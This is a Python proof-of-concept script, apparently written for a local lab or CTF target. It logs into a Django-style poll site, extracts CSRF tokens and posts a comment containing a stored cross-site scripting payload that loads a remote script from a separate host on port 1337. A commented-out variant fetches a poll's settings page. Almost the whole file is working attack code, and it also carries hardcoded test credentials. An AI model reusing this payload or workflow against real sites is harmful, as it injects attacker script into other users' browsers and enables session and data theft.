import requests
from bs4 import BeautifulSoup

URL = 'http://127.0.0.1:8000'

attack_poll_id = '6FT35RsxDq'

user = 'dabch'
password = 'testdaniel'

# payload_script = f"""fetch('/poll/{attack_poll_id}/settings/').then((response) => console.log(response));"""

payload = f'script: <script src="http://localhost:1337/script.js"></script>'



sess = requests.Session()

headers = {'Host': '127.0.0.1:8000',
'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0'}
res = sess.get(URL + '/accounts/login/?next=/', headers=headers)
assert res.status_code == 200
soup = BeautifulSoup(res.text)
csrfmiddlewaretoken = soup.find('form', class_='login').find('input').get('value').strip()

headers = {'Host': '127.0.0.1:8000',
'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0',
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
'Accept-Language': 'en-US,en;q=0.5',
'Accept-Encoding': 'gzip, deflate, br',
'Content-Type': 'application/x-www-form-urlencoded',
'Content-Length': '120',
'Origin': 'http://127.0.0.1:8000',
'DNT': '1',
'Connection': 'keep-alive',
'Referer': 'http://127.0.0.1:8000/accounts/login/?next=/',
'Cookie': f'csrftoken={sess.cookies.get("csrftoken")}',
'Upgrade-Insecure-Requests': '1',
'Sec-Fetch-Dest': 'document',
'Sec-Fetch-Mode': 'navigate',
'Sec-Fetch-Site': 'same-origin',
'Sec-Fetch-User': '?1',
'Pragma': 'no-cache',
'Cache-Control': 'no-cache',}

res = sess.post(URL + '/accounts/login/', headers=headers, data={'csrfmiddlewaretoken': csrfmiddlewaretoken, 'login': user, 'password': password, 'next': '/'}, allow_redirects=False)
assert res.status_code == 302

headers = {
    'Cookie': f'csrftoken={sess.cookies.get("csrftoken")}; sessionid={sess.cookies.get("sessionid")}',
}
res = sess.get(f'{URL}/poll/{attack_poll_id}/', headers=headers)
assert res.status_code == 200
soup = BeautifulSoup(res.text)
csrfmiddlewaretoken = soup.find('form', class_='form', action=f"/poll/{attack_poll_id}/comment/").find('input').get('value').strip()


headers = {
    'Cookie': f'csrftoken={sess.cookies.get("csrftoken")}; sessionid={sess.cookies.get("sessionid")}',
}
res = sess.post(f'{URL}/poll/{attack_poll_id}/comment/', headers=headers, data={'csrfmiddlewaretoken': csrfmiddlewaretoken, 'name': 'David Booker', 'text': payload}, allow_redirects=False)
assert res.status_code == 302